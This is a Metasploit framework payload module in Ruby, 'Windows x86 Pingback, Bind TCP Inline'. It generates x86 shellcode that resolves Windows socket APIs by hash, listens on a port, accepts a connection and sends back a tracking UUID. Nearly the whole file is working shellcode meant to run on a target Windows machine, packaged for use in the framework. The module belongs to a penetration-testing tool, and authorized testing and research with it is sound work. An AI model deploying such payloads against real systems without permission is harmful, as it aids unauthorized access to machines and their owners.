##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/payload/pingback'
require 'msf/core/handler/bind_tcp'
require 'msf/core/payload/windows/block_api'
require 'msf/base/sessions/pingback'
require 'msf/core/payload/windows/exitfunk'

module MetasploitModule

  CachedSize = 301

  include Msf::Payload::Windows
  include Msf::Payload::Single
  include Msf::Payload::Pingback
  include Msf::Payload::Windows::BlockApi
  include Msf::Payload::Pingback::Options
  include Msf::Payload::Windows::Exitfunk


  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Windows x86 Pingback, Bind TCP Inline',
      'Description'   => 'Open a socket and report UUID when a connection is received (Windows x86)',
      'Author'        => [ 'bwatters-r7' ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::BindTcp,
      'Session'       => Msf::Sessions::Pingback
    ))

    def generate_stage
      encoded_port = [datastore['LPORT'].to_i,2].pack("vn").unpack("N").first
      encoded_host = Rex::Socket.addr_aton(datastore['LHOST']||"127.127.127.127").unpack("V").first
      encoded_host_port = "0x%.8x%.8x" % [encoded_host, encoded_port]
      self.pingback_uuid ||= self.generate_pingback_uuid
      uuid_as_db = "0x" + self.pingback_uuid.chars.each_slice(2).map(&:join).join(",0x")
      conf = {exitfunk:   datastore['EXITFUNC']}
      addr_fam      = 2
      sockaddr_size = 16

      asm = %Q^
        cld                    ; Clear the direction flag.
        call start             ; Call start, this pushes the address of 'api_call' onto the stack.
        #{asm_block_api}
        start:
          pop ebp
      ; Input: EBP must be the address of 'api_call'.
      ; Output: EDI will be the newly connected clients socket
      ; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)

      bind_tcp:
        push 0x00003233        ; Push the bytes 'ws2_32',0,0 onto the stack.
        push 0x5F327377        ; ...
        push esp               ; Push a pointer to the "ws2_32" string on the stack.
        push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
        call ebp               ; LoadLibraryA( "ws2_32" )

        mov eax, 0x0190        ; EAX = sizeof( struct WSAData )
        sub esp, eax           ; alloc some space for the WSAData structure
        push esp               ; push a pointer to this stuct
        push eax               ; push the wVersionRequested parameter
        push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSAStartup')}
        call ebp               ; WSAStartup( 0x0190, &WSAData );

        push 11
        pop ecx
      push_0_loop:
        push eax               ; if we succeed, eax will be zero, push it enough times
                               ; to cater for both IPv4 and IPv6
        loop push_0_loop

                               ; push zero for the flags param [8]
                               ; push null for reserved parameter [7]
                               ; we do not specify a WSAPROTOCOL_INFO structure [6]
                               ; we do not specify a protocol [5]
        push 1                 ; push SOCK_STREAM
        push #{addr_fam}       ; push AF_INET/6
        push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSASocketA')}
        call ebp               ; WSASocketA( AF_INET/6, SOCK_STREAM, 0, 0, 0, 0 );
        xchg edi, eax          ; save the socket for later, don't care about the value of eax after this

                               ; bind to 0.0.0.0/[::], pushed earlier

        push #{encoded_port}   ; family AF_INET and port number
        mov esi, esp           ; save a pointer to sockaddr_in struct
        push #{sockaddr_size}  ; length of the sockaddr_in struct (we only set the first 8 bytes, the rest aren't used)
        push esi               ; pointer to the sockaddr_in struct
        push edi               ; socket
        push #{Rex::Text.block_api_hash('ws2_32.dll', 'bind')}
        call ebp               ; bind( s, &sockaddr_in, 16 );
        test eax,eax            ; non-zero means a failure
        jnz failure
                               ; backlog, pushed earlier [3]
        push edi               ; socket
        push #{Rex::Text.block_api_hash('ws2_32.dll', 'listen')}
        call ebp               ; listen( s, 0 );

                               ; we set length for the sockaddr struct to zero, pushed earlier [2]
                               ; we dont set the optional sockaddr param, pushed earlier [1]
        push edi               ; listening socket
        push #{Rex::Text.block_api_hash('ws2_32.dll', 'accept')}
        call ebp               ; accept( s, 0, 0 );

        push edi               ; push the listening socket
        xchg edi, eax          ; replace the listening socket with the new connected socket for further comms
        push #{Rex::Text.block_api_hash('ws2_32.dll', 'closesocket')}
        call ebp               ; closesocket( s );

        send_pingback:
          push 0                 ; flags
          push #{uuid_as_db.split(",").length} ; length of the PINGBACK UUID
          call get_pingback_address  ; put pingback_uuid buffer on the stack
          db #{uuid_as_db}  ; PINGBACK_UUID
        get_pingback_address:
          push edi               ; saved socket
          push #{Rex::Text.block_api_hash('ws2_32.dll', 'send')}
          call ebp               ; call send

        push edi               ; push the listening socket
        xchg edi, eax          ; replace the listening socket with the new connected socket for further comms
        push #{Rex::Text.block_api_hash('ws2_32.dll', 'closesocket')}
        call ebp               ; closesocket( s );

        handle_connect_failure:
          ; decrement our attempt count and try again
          dec dword [esi+8]
          jnz failure

        cleanup_socket:
          ; clear up the socket
          push edi                ; socket handle
          push #{Rex::Text.block_api_hash('ws2_32.dll', 'closesocket')}
          call ebp                ; closesocket(socket)

        failure:
      ^
      if conf[:exitfunk]
        asm << asm_exitfunk(conf)
      end
      Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string
    end
  end
end
